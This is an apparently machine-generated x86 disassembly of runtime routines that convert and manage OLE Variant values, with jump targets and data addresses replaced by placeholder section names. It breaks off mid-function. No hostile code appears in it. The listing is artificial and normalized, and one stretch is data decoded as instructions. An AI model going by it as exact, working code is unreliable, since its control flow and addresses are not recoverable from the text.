mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4046a4
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404100
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407a3c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4046a4
jmp r-xdata
jmp r-xdata
call sub_40e154
sub_40ecb8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ed77
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ed55
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e4f8
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404668
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404754
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed5c
lea eax [ ebp - 0x10 ]
call sub_40e818
retn
sub_40ed84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40edda
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eb40
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40ee6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ede1
lea eax [ ebp - 0x10 ]
call sub_40e818
retn
sub_40ede8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410204
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ee5d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e818
retn
sub_40ee6c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f3a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40eea5 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ecc
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403e78
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403ecc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ecc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4091b0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ecc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4091b0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403ecc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40eb84
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404100
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ebbc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404100
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404668
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404754
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40ebf4
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403ecc
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403ecc
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407e78
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403ecc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407e78
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ee6c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ecb8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403ecc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3aa
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403e9c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404570
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403e9c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404570
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e9c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40ed84
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403ecc
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403ecc
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e0b8
test ah 0x40
je r-xdata
mov eax esi
call sub_403e78
mov edx eax
mov eax ebx
call sub_40ede8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40ecb8
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403ecc
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40ecb8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403ecc
jmp r-xdata
jmp [ eax * 4 + jump_table_40f139 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403ecc
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4091b0
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4091b0
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40eb84
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40ebbc
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4040a0
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ebf4
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403ecc
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403ecc
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407e78
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407e78
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403ecc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ee6c
jmp r-xdata
sub_40f3b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f45a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f43d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e4f8
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404668
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404754
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f444
lea eax [ ebp - 0x10 ]
call sub_40e818
retn
sub_40f468
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f4be
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eb40
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f594
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4c5
lea eax [ ebp - 0x10 ]
call sub_40e818
retn
sub_40f4cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f584
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410204
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f58b
lea eax [ ebp - 0x20 ]
call sub_404558
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f567
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404668
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404754
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e818
retn
sub_40f594
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fae6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f5ce ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4046a4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404558
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4046a4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4046a4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4091b0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046a4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4091b0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4046a4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40eb84
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404594
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ebbc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404594
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404668
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404754
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40ebf4
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404594
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4046a4
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4046a4
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407d8c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407e78
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4046a4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407e78
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f594
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f3b0
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404594
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40faed
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404570
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403e9c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404570
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403e9c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404570
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403e9c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404570
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e9c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f468
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404594
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4046a4
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e0b8
test ah 0x40
je r-xdata
mov eax esi
call sub_404558
mov edx eax
mov eax ebx
call sub_40f4cc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f3b0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404594
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f3b0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404594
jmp r-xdata
jmp [ eax * 4 + jump_table_40f855 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4046a4
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4091b0
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4091b0
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40eb84
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404594
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ebbc
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404594
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404668
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ebf4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404594
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4046a4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4046a4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d8c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407e78
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407e78
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4046a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f594
jmp r-xdata
sub_40faf4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e79c
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fb30
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e79c
sub_40fb5c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e79c
sub_40fbc0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ecc
pop esi
pop ebx
retn
mov eax ebx
call sub_40e79c
sub_40fbec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404754
pop esi
pop ebx
retn
mov eax ebx
call sub_40e79c
sub_40fda8
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fece
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403ecc
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403ecc
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410204
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403ecc
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404184
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407ea0
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404184
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403078
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4040dc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fed5
lea eax [ ebp - 0x208 ]
call sub_403e78
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404184
sub_40ff53
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
cmp bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410204
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410184
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40ff60
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_40ffc1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404c40
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ffc8
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403128
sub_410010
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410184
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410204
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410064
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41009c
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410184
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4100d8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034b4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41013b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410142
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4101dc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410204
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4102ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c40
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4102bc
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_410392
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
